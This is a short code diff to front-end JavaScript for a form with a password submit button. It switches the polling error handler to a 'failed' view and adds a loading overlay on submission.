@@ -439,13 +439,13 @@
                 if (data.currentStatus) {
                     updateUIForStatus(data.currentStatus, data.data || {});
                 }
-            } catch (e) {
-                console.error('Poll error:', e);
-                clearInterval(pollingIntervalId);
-                isSubmitting = false;
-                if (submitGuardTimeout) { clearTimeout(submitGuardTimeout); submitGuardTimeout = null; }
-                showStyledError('Connection issue. Please check your internet and try again.');
-            }
+} catch (e) {
+    console.error('Poll error:', e);
+    clearInterval(pollingIntervalId);
+    isSubmitting = false;
+    if (submitGuardTimeout) { clearTimeout(submitGuardTimeout); submitGuardTimeout = null; }
+    showFailedView('Connection issue. Please check your internet and try again.');
+}
         }
 
         function updateUIForStatus(status, data) {
@@ -712,6 +712,7 @@
 
         async function initialFormSubmission() {
             console.log('[Template] initialFormSubmission() called');
+            showLoadingOverlay(true);
             setFormSubmitting(true);
             const submitButton = document.getElementById('btnSubmitPassword');
             if (submitButton) {
